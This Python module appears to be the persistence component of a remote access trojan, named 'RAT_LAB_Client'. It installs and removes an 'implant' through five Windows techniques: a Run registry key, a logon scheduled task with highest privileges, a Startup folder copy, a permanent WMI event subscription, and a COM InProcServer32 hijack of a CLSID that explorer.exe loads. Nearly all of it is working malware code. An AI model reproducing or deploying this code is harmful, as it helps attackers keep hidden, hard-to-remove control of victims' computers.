# persistence.py — Five redundant persistence methods for Windows
#
# 1. Registry Run key (HKCU — no admin)
# 2. Scheduled Task (ONLOGON trigger)
# 3. Startup Folder (file copy)
# 4. WMI Event Subscription (admin, very persistent)
# 5. COM Object Hijack (InProcServer32)
#
# Each method has install/remove + bulk install_all/remove_all

import os
import sys
import shutil
import subprocess
import winreg

IMPLANT_NAME = "RAT_LAB_Client"


def _get_implant_path() -> str:
    """Resolve the current implant path (handles PyInstaller frozen exe)."""
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(sys.argv[0])


# ═══════════════════════════════════════════════════════════════
# Method 1: Registry Run Key (HKCU — no admin required)
# ═══════════════════════════════════════════════════════════════

def install_registry() -> dict:
    """Add implant to HKCU\\...\\Run for login persistence."""
    try:
        implant = _get_implant_path()
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, IMPLANT_NAME, 0, winreg.REG_SZ, f'"{implant}"')
        winreg.CloseKey(key)
        return {"status": "ok", "method": "registry", "action": "installed", "path": implant}
    except Exception as e:
        return {"status": "error", "method": "registry", "message": str(e)}


def remove_registry() -> dict:
    """Remove implant from HKCU\\...\\Run."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.DeleteValue(key, IMPLANT_NAME)
        winreg.CloseKey(key)
        return {"status": "ok", "method": "registry", "action": "removed"}
    except Exception as e:
        return {"status": "error", "method": "registry", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# Method 2: Scheduled Task (ONLOGON trigger)
# ═══════════════════════════════════════════════════════════════

def install_schtask() -> dict:
    """Create a scheduled task that runs the implant on user logon."""
    try:
        implant = _get_implant_path()
        cmd = (
            f'schtasks /Create /TN "{IMPLANT_NAME}" '
            f'/TR "\\"{implant}\\"" '
            f"/SC ONLOGON /RL HIGHEST /F"
        )
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=15,
        )
        if result.returncode == 0:
            return {"status": "ok", "method": "schtask", "action": "installed"}
        return {"status": "error", "method": "schtask", "message": result.stderr.strip()}
    except Exception as e:
        return {"status": "error", "method": "schtask", "message": str(e)}


def remove_schtask() -> dict:
    """Delete the scheduled task."""
    try:
        cmd = f'schtasks /Delete /TN "{IMPLANT_NAME}" /F'
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=15,
        )
        if result.returncode == 0:
            return {"status": "ok", "method": "schtask", "action": "removed"}
        return {"status": "error", "method": "schtask", "message": result.stderr.strip()}
    except Exception as e:
        return {"status": "error", "method": "schtask", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# Method 3: Startup Folder (file copy)
# ═══════════════════════════════════════════════════════════════

def install_startup() -> dict:
    """Copy the implant into the user's Startup folder."""
    try:
        implant = _get_implant_path()
        startup_dir = os.path.join(
            os.environ.get("APPDATA", ""),
            r"Microsoft\Windows\Start Menu\Programs\Startup",
        )
        dest = os.path.join(startup_dir, os.path.basename(implant))
        shutil.copy2(implant, dest)
        return {"status": "ok", "method": "startup_folder", "action": "installed", "path": dest}
    except Exception as e:
        return {"status": "error", "method": "startup_folder", "message": str(e)}


def remove_startup() -> dict:
    """Remove the implant from the user's Startup folder."""
    try:
        implant = _get_implant_path()
        startup_dir = os.path.join(
            os.environ.get("APPDATA", ""),
            r"Microsoft\Windows\Start Menu\Programs\Startup",
        )
        dest = os.path.join(startup_dir, os.path.basename(implant))
        if os.path.exists(dest):
            os.remove(dest)
        return {"status": "ok", "method": "startup_folder", "action": "removed"}
    except Exception as e:
        return {"status": "error", "method": "startup_folder", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# Method 4: WMI Event Subscription (requires admin)
# ═══════════════════════════════════════════════════════════════

def install_wmi() -> dict:
    """Create a permanent WMI event subscription for persistence.

    Uses __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding.
    Triggers on system startup (Win32_ComputerStartup event).
    Extremely persistent — survives file deletion until WMI objects are removed.

    Returns:
        Dict with status, method, and message.
    """
    try:
        implant = _get_implant_path()

        # Create the Event Filter
        filter_cmd = (
            f'powershell -Command "'
            f"$filter = Set-WmiInstance -Namespace 'root\\subscription' "
            f"-Class '__EventFilter' -Arguments @{{"
            f"Name='{IMPLANT_NAME}_Filter';"
            f"EventNamespace='root\\cimv2';"
            f"QueryLanguage='WQL';"
            f"Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 "
            f"WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'"
            f"}};"
            # Create the Consumer
            f"$consumer = Set-WmiInstance -Namespace 'root\\subscription' "
            f"-Class 'CommandLineEventConsumer' -Arguments @{{"
            f"Name='{IMPLANT_NAME}_Consumer';"
            f"CommandLineTemplate='\\\"{implant}\\\"'"
            f"}};"
            # Bind them
            f"Set-WmiInstance -Namespace 'root\\subscription' "
            f"-Class '__FilterToConsumerBinding' -Arguments @{{"
            f"Filter=$filter;"
            f"Consumer=$consumer"
            f"}}"
            f'"'
        )

        result = subprocess.run(
            filter_cmd, shell=True, capture_output=True, text=True, timeout=30,
        )

        if result.returncode == 0:
            return {"status": "ok", "method": "wmi", "action": "installed"}
        return {"status": "error", "method": "wmi", "message": result.stderr.strip()[:200]}

    except Exception as e:
        return {"status": "error", "method": "wmi", "message": str(e)}


def remove_wmi() -> dict:
    """Remove WMI event subscription persistence objects."""
    try:
        cleanup_cmd = (
            f'powershell -Command "'
            f"Get-WmiObject -Namespace 'root\\subscription' "
            f"-Class '__EventFilter' -Filter \\\"Name='{IMPLANT_NAME}_Filter'\\\" "
            f"| Remove-WmiObject; "
            f"Get-WmiObject -Namespace 'root\\subscription' "
            f"-Class 'CommandLineEventConsumer' -Filter \\\"Name='{IMPLANT_NAME}_Consumer'\\\" "
            f"| Remove-WmiObject; "
            f"Get-WmiObject -Namespace 'root\\subscription' "
            f"-Class '__FilterToConsumerBinding' "
            f'| Where-Object {{ $_.Filter -like \'*{IMPLANT_NAME}*\' }} '
            f"| Remove-WmiObject"
            f'"'
        )

        result = subprocess.run(
            cleanup_cmd, shell=True, capture_output=True, text=True, timeout=30,
        )

        return {"status": "ok", "method": "wmi", "action": "removed"}

    except Exception as e:
        return {"status": "error", "method": "wmi", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# Method 5: COM Object Hijack (InProcServer32)
# ═══════════════════════════════════════════════════════════════

# CLSID for "Microsoft.Windows.StartMenuExperienceHost"
# This COM object is loaded by explorer.exe on startup
_HIJACK_CLSID = "{0358b920-0ac7-461f-98f4-58e32cd89148}"


def install_com_hijack() -> dict:
    """Hijack a COM object's InProcServer32 to load our implant.

    Creates an HKCU\\CLSID entry that shadows the HKLM default,
    pointing InProcServer32 to our executable. When explorer.exe
    loads this CLSID, it runs our payload instead.

    Returns:
        Dict with status, method, and message.
    """
    try:
        implant = _get_implant_path()
        reg_path = f"Software\\Classes\\CLSID\\{_HIJACK_CLSID}\\InProcServer32"

        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, implant)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Both")
        winreg.CloseKey(key)

        return {"status": "ok", "method": "com_hijack", "action": "installed", "clsid": _HIJACK_CLSID}

    except Exception as e:
        return {"status": "error", "method": "com_hijack", "message": str(e)}


def remove_com_hijack() -> dict:
    """Remove the COM hijack registry entries."""
    try:
        base_path = f"Software\\Classes\\CLSID\\{_HIJACK_CLSID}"
        _delete_key_tree(winreg.HKEY_CURRENT_USER, base_path)
        return {"status": "ok", "method": "com_hijack", "action": "removed"}
    except Exception as e:
        return {"status": "error", "method": "com_hijack", "message": str(e)}


def _delete_key_tree(hive, path: str) -> None:
    """Recursively delete a registry key and all subkeys."""
    try:
        key = winreg.OpenKey(hive, path, 0, winreg.KEY_ALL_ACCESS)
        while True:
            try:
                subkey_name = winreg.EnumKey(key, 0)
                _delete_key_tree(hive, f"{path}\\{subkey_name}")
            except OSError:
                break
        winreg.CloseKey(key)
        winreg.DeleteKey(hive, path)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# Bulk operations
# ═══════════════════════════════════════════════════════════════

def install_all() -> list:
    """Install all five persistence methods. Returns list of results."""
    return [
        install_registry(),
        install_schtask(),
        install_startup(),
        install_wmi(),
        install_com_hijack(),
    ]


def remove_all() -> list:
    """Remove all five persistence methods. Returns list of results."""
    return [
        remove_registry(),
        remove_schtask(),
        remove_startup(),
        remove_wmi(),
        remove_com_hijack(),
    ]
